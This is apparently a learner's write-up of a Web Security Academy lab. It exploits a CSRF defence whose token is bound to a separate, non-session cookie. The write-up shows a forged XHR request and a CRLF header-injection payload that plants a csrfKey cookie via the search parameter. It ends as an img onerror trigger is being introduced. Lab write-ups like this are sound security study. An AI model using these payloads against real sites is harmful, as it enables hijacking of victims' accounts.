# CSRF — Token Validation Tied to a Separate, Non-Session Cookie

The email-change function tries to use a token-based CSRF defense, but that token is validated against a cookie that's independent of the main session cookie — not fully wired into the session system.

**Goal:** Host an HTML page on the exploit server that performs a CSRF attack to change the victim's email address.

I found a snippet for setting a browser cookie via JS (source: https://stackoverflow.com/questions/14573223/set-cookie-and-get-cookie-with-javascript):

```
function setCookie(name,value,days) {
    var expires = "";
    if (days) {
        var date = new Date();
        date.setTime(date.getTime() + (days*24*60*60*1000));
        expires = "; expires=" + date.toUTCString();
    }
    document.cookie = name + "=" + (value || "")  + expires + "; path=/";
}

setCookie('ppkcookie','testcookie',7);
```

That approach won't actually work though, since what's needed is to control the Cookie *header* itself, not just the browser's stored cookies. XHR lets you set request headers directly (reference: https://learn.microsoft.com/en-us/troubleshoot/developer/webapps/iis/active-server-pages/xmlhttprequest-setrequestheader-method-cookies), so next I tried building a POST request via XHR in JavaScript (reference: https://stackoverflow.com/questions/9713058/send-post-data-using-xmlhttprequest):

```
<script>

var xhr = new XMLHttpRequest();
var url = "https://0a7900c3035d83b782ebb0de009400e0.web-security-academy.net";
xhr.open('POST', url+'/my-account/change-email', true);

xhr.setRequestHeader('Content-type', 'application/x-www-form-urlencoded');
xhr.setRequestHeader('Cookie', 'TESTING');
xhr.setRequestHeader('Cookie', 'csrfKey=Eb67I1HyfMZGN1o9KZWih0EwODxdozMg');

xhr.onload = function () {
    // do something to response
    console.log(this.responseText);
};
xhr.send('email=test12&#64;test&#46;com&csrf=V99KDCadmiyH6AJ1jjXnlHyZxdfQtEkl');

</script>
```

This also fails.

Looking at the application again, the search function turns out to set a value in the Cookie HTTP header:

<img width="715" height="167" alt="3" src="https://github.com/user-attachments/assets/57b51589-446c-4fc5-9733-cae11decc07e" />


It gets stored as `LastSearchTerm`:

<img width="661" height="361" alt="4" src="https://github.com/user-attachments/assets/f8b6033d-e3ad-483c-82db-1f3cb657ac79" />


Based on the official write-up, the following payload is needed:

```
/?search=test%0d%0aSet-Cookie:%20csrfKey=YOUR-KEY%3b%20SameSite=None
```

- `%0A` is a newline character (`\n`)
- `%0D` is a carriage return (`\r`)
- `Set-Cookie` overwrites the value sent in the Cookie HTTP header

An `img` element is used to trigger the malicious URL, and its `onerror` handler submits the form Burp generated:
